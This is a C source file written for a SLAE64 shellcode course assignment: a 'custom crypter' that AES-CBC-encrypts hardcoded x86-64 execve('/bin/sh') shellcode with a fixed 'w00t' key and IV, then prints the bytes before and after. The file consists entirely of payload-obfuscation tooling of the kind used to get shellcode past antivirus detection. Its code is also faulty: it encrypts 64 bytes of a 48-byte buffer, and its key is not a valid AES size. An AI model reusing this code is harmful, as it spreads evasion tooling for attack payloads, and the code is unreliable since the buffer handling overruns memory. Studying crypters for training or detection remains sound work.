// Student ID     : SLAE64-1611
// Student Name   : Jonathan "Chops" Crosby
// Assignment 7   : Custom Crypter
// File Name      : crypter.c
// Derived From   : https://github.com/kokke/tiny-AES-c

#include <stdio.h>
#include <string.h>
#include <stdint.h>

#define CBC 1
#define CTR 1
#define ECB 1

#include "aes.h"

static void encrypt_cbc(void)
{

    //w00t...
    uint8_t key[] = { 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74 };

    //original /bin/sh shellcode arranged on 16 byte alignment
    uint8_t in[] = { 0x48, 0x31, 0xc0, 0x48, 0x83, 0xc0, 0x3b, 0x4d,
                     0x31, 0xc9, 0x41, 0x51, 0x48, 0xbb, 0x2f, 0x2f,
                     0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x53, 0x48,
                     0x89, 0xe7, 0x41, 0x51, 0x48, 0x89, 0xe2, 0x57,
                     0x48, 0x89, 0xe6, 0x0f, 0x05, 0x90, 0x90, 0x90,
                     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };

    //w00tw00tw00tw00t
    uint8_t iv[]  = { 0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74,
                      0x77, 0x30, 0x30, 0x74, 0x77, 0x30, 0x30, 0x74 };


    printf("\n");

    printf("\n\nOriginal Shellcode:\n");
    printf("--------------------\n");

    int i;
    for (i = 0; i < sizeof in; i ++)
    {
        printf("\\0x%02x", in[i]);
    }


    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CBC_encrypt_buffer(&ctx, in, 64);

    printf("\n");

    printf("\n\nEncrypted Shellcode:\n");
    printf("--------------------\n");

    for (i = 0; i < sizeof in; i ++)
    {
        printf("\\0x%02x", in[i]);
    }

    printf("\n");
    printf("\n");
}

int main(void)
{
    encrypt_cbc();
    return 0;
}
